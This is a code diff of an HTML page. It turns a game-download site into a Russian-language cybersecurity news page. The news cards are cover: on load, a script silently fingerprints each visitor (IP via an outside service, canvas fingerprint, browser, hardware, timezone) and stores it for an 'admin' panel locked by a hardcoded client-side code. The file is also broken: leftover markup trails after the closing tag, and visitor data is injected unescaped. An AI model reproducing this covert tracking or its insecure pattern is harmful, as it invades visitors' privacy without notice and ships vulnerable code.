@@ -3,213 +3,757 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DoosGames - Бесплатные игры без торрента</title>
+    <title>CyberNews - Актуальные новости</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
-        
+
         body {
-            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
-            color: white;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
-            padding: 20px;
-            overflow-x: hidden;
+            color: #333;
         }
-        
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-        }
-        
-        header {
-            text-align: center;
-            padding: 40px 0;
-        }
-        
-        h1 {
-            font-size: 3.5rem;
-            margin-bottom: 10px;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
-        }
-        
-        .subtitle {
-            font-size: 1.5rem;
-            opacity: 0.9;
-            margin-bottom: 30px;
-            font-weight: 500;
-        }
-        
-        .loading {
-            text-align: center;
-            padding: 40px;
-            font-size: 1.2rem;
-        }
-        
-        .files-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
-            gap: 25px;
-            margin-top: 30px;
-        }
-        
-        .file-card {
-            background: rgba(255, 255, 255, 0.1);
+
+        .header {
+            background: rgba(255, 255, 255, 0.95);
             backdrop-filter: blur(10px);
-            border-radius: 15px;
-            padding: 25px;
-            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
-            border: 1px solid rgba(255, 255, 255, 0.18);
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-        }
-        
-        .file-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.3);
-        }
-        
-        .file-name {
-            font-size: 1.4rem;
-            margin-bottom: 15px;
-            font-weight: 600;
-            text-align: center;
-        }
-        
-        .download-btn {
-            display: block;
+            padding: 1rem 2rem;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            position: fixed;
             width: 100%;
-            padding: 12px;
-            background: linear-gradient(to right, #8e2de2, #4a00e0);
+            top: 0;
+            z-index: 1000;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 1.8rem;
+            font-weight: bold;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .admin-btn {
+            background: linear-gradient(135deg, #667eea, #764ba2);
             color: white;
             border: none;
-            border-radius: 8px;
-            font-size: 1.1rem;
-            font-weight: 600;
+            padding: 0.7rem 1.5rem;
+            border-radius: 25px;
             cursor: pointer;
+            font-weight: 600;
             transition: all 0.3s ease;
-            text-align: center;
-            text-decoration: none;
+            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
         }
-        
-        .download-btn:hover {
-            background: linear-gradient(to right, #7a1fd1, #3a00c8);
-            transform: scale(1.03);
+
+        .admin-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
         }
-        
-        .no-files {
-            text-align: center;
-            padding: 40px;
-            font-size: 1.2rem;
-            background: rgba(255, 255, 255, 0.1);
+
+        .container {
+            max-width: 1200px;
+            margin: 100px auto 2rem;
+            padding: 0 2rem;
+        }
+
+        .news-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+            gap: 2rem;
+            margin-top: 2rem;
+        }
+
+        .news-card {
+            background: rgba(255, 255, 255, 0.95);
             border-radius: 15px;
-            margin-top: 30px;
-            position: relative;
-            height: 200px;
+            padding: 2rem;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+            transition: all 0.3s ease;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            display: flex;
+            flex-direction: column;
+            height: fit-content;
+        }
+
+        .news-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.15);
+        }
+
+        .news-date {
+            color: #667eea;
+            font-size: 0.9rem;
+            margin-bottom: 0.5rem;
+        }
+
+        .news-title {
+            font-size: 1.3rem;
+            font-weight: 600;
+            margin-bottom: 1rem;
+            color: #2d3748;
+        }
+
+        .news-content {
+            color: #4a5568;
+            line-height: 1.6;
+            margin-bottom: 1rem;
             overflow: hidden;
         }
-        
-        .tumbleweed {
-            position: absolute;
-            bottom: 20px;
-            left: -100px;
-            width: 80px;
-            height: 80px;
-            background: radial-gradient(circle at 30px 30px, #f4d03f, #d68910);
-            border-radius: 50%;
-            animation: tumble 8s linear infinite;
-            box-shadow: 0 0 10px rgba(244, 208, 63, 0.5);
+
+        .news-content.short {
+            max-height: 120px;
+            display: -webkit-box;
+            -webkit-line-clamp: 4;
+            -webkit-box-orient: vertical;
         }
-        
-        .tumbleweed::before, .tumbleweed::after {
-            content: '';
-            position: absolute;
-            background: radial-gradient(circle at center, #f4d03f, #d68910);
-            border-radius: 50%;
+
+        .expand-btn {
+            background: transparent;
+            color: #667eea;
+            border: 2px solid #667eea;
+            padding: 0.5rem 1rem;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            margin-top: auto;
+            align-self: flex-start;
         }
-        
-        .tumbleweed::before {
-            width: 60px;
-            height: 60px;
-            top: -10px;
-            left: 10px;
+
+        .expand-btn:hover {
+            background: #667eea;
+            color: white;
         }
-        
-        .tumbleweed::after {
-            width: 50px;
-            height: 50px;
-            bottom: -5px;
-            right: 10px;
+
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(5px);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+            animation: fadeIn 0.3s ease;
         }
-        
-        .no-files-text {
-            position: relative;
-            z-index: 2;
-            margin-top: 20px;
-        }
-        
-        @keyframes tumble {
-            0% {
-                transform: translateX(0) rotate(0deg);
-            }
-            100% {
-                transform: translateX(calc(100vw + 200px)) rotate(720deg);
-            }
-        }
-        
-        footer {
+
+        .modal-content {
+            background: white;
+            padding: 2rem;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            max-width: 500px;
+            width: 90%;
             text-align: center;
-            margin-top: 50px;
-            padding: 20px;
-            font-size: 0.9rem;
-            opacity: 0.7;
+            animation: slideUp 0.4s ease;
+            position: relative;
         }
-        
-        @media (max-width: 768px) {
-            h1 {
-                font-size: 2.5rem;
+
+        .modal-title {
+            font-size: 1.5rem;
+            margin-bottom: 1.5rem;
+            color: #2d3748;
+        }
+
+        .code-input {
+            width: 100%;
+            padding: 1rem;
+            border: 2px solid #e2e8f0;
+            border-radius: 10px;
+            font-size: 1.1rem;
+            text-align: center;
+            margin-bottom: 1.5rem;
+            transition: border-color 0.3s ease;
+        }
+
+        .code-input:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+
+        .modal-btn {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            border: none;
+            padding: 1rem 2rem;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 1rem;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            width: 100%;
+        }
+
+        .modal-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.4);
+        }
+
+        .admin-panel {
+            background: rgba(255, 255, 255, 0.98);
+            border-radius: 20px;
+            padding: 2rem;
+            margin-top: 2rem;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.1);
+            display: none;
+        }
+
+        .admin-title {
+            font-size: 1.8rem;
+            margin-bottom: 1.5rem;
+            color: #2d3748;
+            text-align: center;
+        }
+
+        .visitors-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 1rem;
+            margin-top: 1.5rem;
+        }
+
+        .visitor-btn {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            border: none;
+            padding: 1rem;
+            border-radius: 10px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            text-align: center;
+        }
+
+        .visitor-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.4);
+        }
+
+        .data-modal {
+            max-width: 800px;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+
+        .data-content {
+            background: #f7fafc;
+            padding: 1.5rem;
+            border-radius: 10px;
+            margin-top: 1rem;
+            text-align: left;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+
+        .close-btn {
+            position: absolute;
+            top: 1rem;
+            right: 1rem;
+            background: none;
+            border: none;
+            font-size: 1.5rem;
+            cursor: pointer;
+            color: #718096;
+            transition: color 0.3s ease;
+        }
+
+        .close-btn:hover {
+            color: #2d3748;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes slideUp {
+            from { 
+                opacity: 0;
+                transform: translateY(30px);
             }
-            
-            .subtitle {
-                font-size: 1.2rem;
+            to { 
+                opacity: 1;
+                transform: translateY(0);
             }
-            
-            .files-grid {
-                grid-template-columns: 1fr;
-            }
-            
-            .tumbleweed {
-                width: 60px;
-                height: 60px;
-            }
-            
-            .tumbleweed::before {
-                width: 45px;
-                height: 45px;
-            }
-            
-            .tumbleweed::after {
-                width: 40px;
-                height: 40px;
-            }
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-10px); }
+            75% { transform: translateX(10px); }
+        }
+
+        .shake {
+            animation: shake 0.5s ease;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 2rem;
+            color: white;
+            margin-top: 4rem;
+        }
+
+        .loading {
+            text-align: center;
+            color: white;
+            font-size: 1.2rem;
+            margin: 2rem 0;
+        }
+
+        .news-modal {
+            max-width: 600px;
+            max-height: 80vh;
+        }
+
+        .full-news-content {
+            color: #4a5568;
+            line-height: 1.6;
+            text-align: left;
+            max-height: 400px;
+            overflow-y: auto;
+            padding: 1rem 0;
+        }
+
+        .debug-info {
+            position: fixed;
+            bottom: 10px;
+            right: 10px;
+            background: rgba(0,0,0,0.8);
+            color: white;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 12px;
+            display: none;
         }
     </style>
 </head>
 <body>
+    <header class="header">
+        <div class="logo">CyberNews</div>
+        <button class="admin-btn" id="adminButton">АДМИН</button>
+    </header>
+
     <div class="container">
-        <header>
-            <h1>DoosGames</h1>
-            <p class="subtitle">Бесплатные игры без торрента</p>
-        </header>
+        <h1 style="color: white; text-align: center; margin-bottom: 2rem;">Актуальные новости кибербезопасности</h1>
         
-        <main>
-            <div id="loading" class="loading">
-                Загрузка файлов из репозитория...
-            </div>
+        <div class="loading" id="loadingNews">Загрузка актуальных новостей...</div>
+        <div class="news-grid" id="newsGrid"></div>
+
+        <div class="admin-panel" id="adminPanel">
+            <h2 class="admin-title">Панель администратора</h2>
+            <div class="visitors-grid" id="visitorsGrid"></div>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <p>© 2024 CyberNews. Все права защищены.</p>
+    </footer>
+
+    <!-- Admin Login Modal -->
+    <div class="modal-overlay" id="adminModal">
+        <div class="modal-content">
+            <button class="close-btn" id="closeAdminModal">×</button>
+            <h2 class="modal-title">Введите код доступа</h2>
+            <input type="password" class="code-input" id="adminCode" placeholder="Введите код...">
+            <button class="modal-btn" id="confirmAdminCode">ПОДТВЕРДИТЬ</button>
+        </div>
+    </div>
+
+    <!-- Data View Modal -->
+    <div class="modal-overlay" id="dataModal">
+        <div class="modal-content data-modal">
+            <button class="close-btn" id="closeDataModal">×</button>
+            <h2 class="modal-title">Данные посетителя</h2>
+            <div class="data-content" id="dataContent"></div>
+        </div>
+    </div>
+
+    <!-- News Modal -->
+    <div class="modal-overlay" id="newsModal">
+        <div class="modal-content news-modal">
+            <button class="close-btn" id="closeNewsModal">×</button>
+            <h2 class="modal-title" id="newsModalTitle"></h2>
+            <div class="news-date" id="newsModalDate"></div>
+            <div class="full-news-content" id="newsModalContent"></div>
+        </div>
+    </div>
+
+    <div class="debug-info" id="debugInfo"></div>
+
+    <script>
+        // Debug function
+        function debug(message) {
+            console.log('DEBUG:', message);
+            const debugInfo = document.getElementById('debugInfo');
+            debugInfo.innerHTML += message + '<br>';
+            debugInfo.style.display = 'block';
+        }
+
+        // Real data collection
+        class AdvancedDataCollector {
+            constructor() {
+                this.collectedData = {};
+            }
+
+            async collectComprehensiveData() {
+                this.collectedData = {
+                    timestamp: new Date().toISOString(),
+                    url: window.location.href,
+                    referrer: document.referrer,
+                    browser: this.collectBrowserInfo(),
+                    screen: this.collectScreenInfo(),
+                    network: await this.collectNetworkInfo(),
+                    hardware: this.collectHardwareInfo(),
+                    time: this.collectTimeInfo(),
+                    advanced: this.collectAdvancedFingerprint()
+                };
+
+                this.saveToStorage();
+                return this.collectedData;
+            }
+
+            collectBrowserInfo() {
+                return {
+                    userAgent: navigator.userAgent,
+                    language: navigator.language,
+                    languages: navigator.languages,
+                    platform: navigator.platform,
+                    cookieEnabled: navigator.cookieEnabled,
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    deviceMemory: navigator.deviceMemory || 'unknown',
+                    vendor: navigator.vendor
+                };
+            }
+
+            collectScreenInfo() {
+                return {
+                    screenWidth: screen.width,
+                    screenHeight: screen.height,
+                    colorDepth: screen.colorDepth,
+                    availWidth: screen.availWidth,
+                    availHeight: screen.availHeight
+                };
+            }
+
+            async collectNetworkInfo() {
+                let publicIP = 'unknown';
+                try {
+                    const response = await fetch('https://api.ipify.org?format=json');
+                    const data = await response.json();
+                    publicIP = data.ip;
+                } catch (error) {
+                    console.log('IP detection failed');
+                }
+
+                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                let networkInfo = {
+                    online: navigator.onLine,
+                    publicIP: publicIP
+                };
+
+                if (connection) {
+                    networkInfo.effectiveType = connection.effectiveType;
+                    networkInfo.downlink = connection.downlink;
+                    networkInfo.rtt = connection.rtt;
+                }
+
+                return networkInfo;
+            }
+
+            collectHardwareInfo() {
+                return {
+                    cores: navigator.hardwareConcurrency,
+                    memory: navigator.deviceMemory || 'unknown'
+                };
+            }
+
+            collectTimeInfo() {
+                return {
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    locale: Intl.DateTimeFormat().resolvedOptions().locale,
+                    visitTime: new Date().toISOString()
+                };
+            }
+
+            collectAdvancedFingerprint() {
+                return {
+                    canvasFingerprint: this.getCanvasFingerprint(),
+                    timezoneOffset: new Date().getTimezoneOffset()
+                };
+            }
+
+            getCanvasFingerprint() {
+                try {
+                    const canvas = document.createElement('canvas');
+                    const ctx = canvas.getContext('2d');
+                    ctx.textBaseline = "top";
+                    ctx.font = "14px 'Arial'";
+                    ctx.fillStyle = "#f60";
+                    ctx.fillRect(125,1,62,20);
+                    ctx.fillStyle = "#069";
+                    ctx.fillText("Hello, World!", 2, 15);
+                    return canvas.toDataURL();
+                } catch {
+                    return 'unavailable';
+                }
+            }
+
+            saveToStorage() {
+                let visitors = JSON.parse(localStorage.getItem('visitors') || '[]');
+                const visitorData = {
+                    id: Date.now(),
+                    ip: this.collectedData.network.publicIP,
+                    data: this.collectedData,
+                    timestamp: new Date().toISOString()
+                };
+                visitors.push(visitorData);
+                localStorage.setItem('visitors', JSON.stringify(visitors));
+                debug('Data saved to storage: ' + visitorData.ip);
+            }
+        }
+
+        // News fetcher
+        class ReliableNewsFetcher {
+            getPredefinedNews() {
+                const currentDate = new Date();
+                return [
+                    {
+                        title: "Кибербезопасность в 2024: основные тренды и угрозы",
+                        content: "Эксперты выделяют рост атак на цепочки поставок, увеличение количества атак с использованием ИИ...",
+                        fullContent: "Эксперты выделяют рост атак на цепочки поставок, увеличение количества атак с использованием ИИ, а также усиление угроз для облачной инфраструктуры. Компании все чаще инвестируют в системы обнаружения и предотвращения угроз на основе машинного обучения. Особое внимание уделяется защите удаленных рабочих мест и мобильных устройств.",
+                        date: currentDate.toLocaleDateString('ru-RU'),
+                        source: "CyberSecurity Review"
+                    },
+                    {
+                        title: "Новые уязвимости в популярных фреймворках",
+                        content: "Обнаружены критические уязвимости в веб-фреймворках, позволяющие выполнение произвольного кода...",
+                        fullContent: "Обнаружены критические уязвимости в популярных веб-фреймворках, позволяющие выполнение произвольного кода. Разработчики выпустили экстренные обновления безопасности. Рекомендуется немедленно обновить системы до последних версий. Уязвимости затрагивают компоненты аутентификации и обработки пользовательских данных.",
+                        date: new Date(currentDate - 86400000).toLocaleDateString('ru-RU'),
+                        source: "Security Bulletin"
+                    },
+                    {
+                        title: "ИИ в защите от кибератак: новые возможности",
+                        content: "Нейросети помогают обнаруживать сложные паттерны атак в реальном времени...",
+                        fullContent: "Нейросети помогают обнаруживать сложные паттерны атак в реальном времени. Современные системы на основе ИИ способны анализировать терабайты сетевого трафика и выявлять аномалии. Машинное обучение используется для прогнозирования атак и автоматического реагирования на инциденты.",
+                        date: new Date(currentDate - 2*86400000).toLocaleDateString('ru-RU'),
+                        source: "AI Security Journal"
+                    }
+                ];
+            }
+        }
+
+        // Admin functionality - COMPLETELY REWRITTEN
+        class AdminManager {
+            constructor() {
+                this.ADMIN_CODE = "11448888";
+                this.init();
+            }
+
+            init() {
+                debug('AdminManager initialized');
+                
+                // Add event listeners
+                document.getElementById('adminButton').addEventListener('click', () => this.openAdminModal());
+                document.getElementById('closeAdminModal').addEventListener('click', () => this.closeAdminModal());
+                document.getElementById('confirmAdminCode').addEventListener('click', () => this.checkAdminCode());
+                document.getElementById('closeDataModal').addEventListener('click', () => this.closeDataModal());
+                document.getElementById('closeNewsModal').addEventListener('click', () => this.closeNewsModal());
+                
+                // Enter key support for admin code
+                document.getElementById('adminCode').addEventListener('keypress', (e) => {
+                    if (e.key === 'Enter') {
+                        this.checkAdminCode();
+                    }
+                });
+
+                // Close modals on outside click
+                document.getElementById('adminModal').addEventListener('click', (e) => {
+                    if (e.target === document.getElementById('adminModal')) {
+                        this.closeAdminModal();
+                    }
+                });
+
+                document.getElementById('dataModal').addEventListener('click', (e) => {
+                    if (e.target === document.getElementById('dataModal')) {
+                        this.closeDataModal();
+                    }
+                });
+
+                document.getElementById('newsModal').addEventListener('click', (e) => {
+                    if (e.target === document.getElementById('newsModal')) {
+                        this.closeNewsModal();
+                    }
+                });
+            }
+
+            openAdminModal() {
+                debug('Opening admin modal');
+                document.getElementById('adminModal').style.display = 'flex';
+                document.getElementById('adminCode').focus();
+            }
+
+            closeAdminModal() {
+                debug('Closing admin modal');
+                document.getElementById('adminModal').style.display = 'none';
+                document.getElementById('adminCode').value = '';
+            }
+
+            checkAdminCode() {
+                const inputCode = document.getElementById('adminCode').value;
+                const modal = document.getElementById('adminModal');
+                
+                debug('Checking code: ' + inputCode);
+                
+                if (inputCode === this.ADMIN_CODE) {
+                    debug('Code correct! Opening admin panel');
+                    this.closeAdminModal();
+                    this.showAdminPanel();
+                } else {
+                    debug('Wrong code! Shaking modal');
+                    modal.classList.add('shake');
+                    setTimeout(() => {
+                        modal.classList.remove('shake');
+                        this.closeAdminModal();
+                    }, 500);
+                }
+            }
+
+            showAdminPanel() {
+                debug('Showing admin panel');
+                document.getElementById('adminPanel').style.display = 'block';
+                this.loadVisitors();
+            }
+
+            loadVisitors() {
+                const visitorsGrid = document.getElementById('visitorsGrid');
+                const visitors = JSON.parse(localStorage.getItem('visitors') || '[]');
+                
+                debug('Loading visitors: ' + visitors.length);
+                
+                visitorsGrid.innerHTML = '';
+                
+                if (visitors.length === 0) {
+                    visitorsGrid.innerHTML = '<p style="grid-column: 1/-1; text-align: center; color: #666;">Нет данных о посетителях</p>';
+                    return;
+                }
+                
+                visitors.forEach(visitor => {
+                    const button = document.createElement('button');
+                    button.className = 'visitor-btn';
+                    button.textContent = `IP: ${visitor.ip}`;
+                    button.addEventListener('click', () => this.showVisitorData(visitor));
+                    visitorsGrid.appendChild(button);
+                });
+            }
+
+            showVisitorData(visitor) {
+                debug('Showing visitor data: ' + visitor.ip);
+                const dataContent = document.getElementById('dataContent');
+                dataContent.innerHTML = `
+                    <div><strong>Время визита:</strong> ${new Date(visitor.timestamp).toLocaleString('ru-RU')}</div>
+                    <div><strong>IP адрес:</strong> ${visitor.ip}</div>
+                    <div><strong>Браузер:</strong> ${visitor.data.browser.userAgent}</div>
+                    <div><strong>Платформа:</strong> ${visitor.data.browser.platform}</div>
+                    <div><strong>Язык:</strong> ${visitor.data.browser.language}</div>
+                    <div><strong>Экран:</strong> ${visitor.data.screen.screenWidth}x${visitor.data.screen.screenHeight}</div>
+                    <div><strong>Ядер CPU:</strong> ${visitor.data.hardware.cores}</div>
+                    <div><strong>Память:</strong> ${visitor.data.hardware.memory}GB</div>
+                    <div><strong>Часовой пояс:</strong> ${visitor.data.time.timezone}</div>
+                    <br>
+                    <details>
+                        <summary><strong>Полные данные (JSON):</strong></summary>
+                        <pre>${JSON.stringify(visitor.data, null, 2)}</pre>
+                    </details>
+                `;
+                document.getElementById('dataModal').style.display = 'flex';
+            }
+
+            closeDataModal() {
+                document.getElementById('dataModal').style.display = 'none';
+            }
+
+            closeNewsModal() {
+                document.getElementById('newsModal').style.display = 'none';
+            }
+        }
+
+        // News display functions
+        function showFullNews(newsItem) {
+            document.getElementById('newsModalTitle').textContent = newsItem.title;
+            document.getElementById('newsModalDate').textContent = `${newsItem.date} | ${newsItem.source}`;
+            document.getElementById('newsModalContent').textContent = newsItem.fullContent || newsItem.content;
+            document.getElementById('newsModal').style.display = 'flex';
+        }
+
+        // Initialize news
+        async function initializeNews() {
+            const newsGrid = document.getElementById('newsGrid');
+            const loading = document.getElementById('loadingNews');
             
-            <div id="files-container" class="files-grid" style="display: none;">
+            try {
+                const newsFetcher = new ReliableNewsFetcher();
+                const news = newsFetcher.getPredefinedNews();
+                
+                loading.style.display = 'none';
+                
+                news.forEach(item => {
+                    const card = document.createElement('div');
+                    card.className = 'news-card';
+                    card.innerHTML = `
+                        <div class="news-date">${item.date} | ${item.source}</div>
+                        <h3 class="news-title">${item.title}</h3>
+                        <div class="news-content short">${item.content}</div>
+                        <button class="expand-btn" onclick="showFullNews(${JSON.stringify(item).replace(/"/g, '&quot;')})">
+                            Развернуть новость
+                        </button>
+                    `;
+                    newsGrid.appendChild(card);
+                });
+            } catch (error) {
+                loading.textContent = 'Ошибка загрузки новостей. Попробуйте обновить страницу.';
+                console.error('News initialization error:', error);
+            }
+        }
+
+        // Initialize data collection
+        function initializeDataCollection() {
+            const collector = new AdvancedDataCollector();
+            collector.collectComprehensiveData().catch(console.error);
+        }
+
+        // Initialize everything when page loads
+        document.addEventListener('DOMContentLoaded', function() {
+            debug('Page loaded');
+            
+            // Initialize admin manager
+            window.adminManager = new AdminManager();
+            
+            // Initialize other components
+            initializeNews();
+            initializeDataCollection();
+            
+            debug('All components initialized');
+        });
+
+        // Make functions global for onclick handlers
+        window.showFullNews = showFullNews;
+    </script>
+</body>
+</html>            <div id="files-container" class="files-grid" style="display: none;">
                 <!-- Файлы будут добавлены здесь динамически -->
             </div>
             
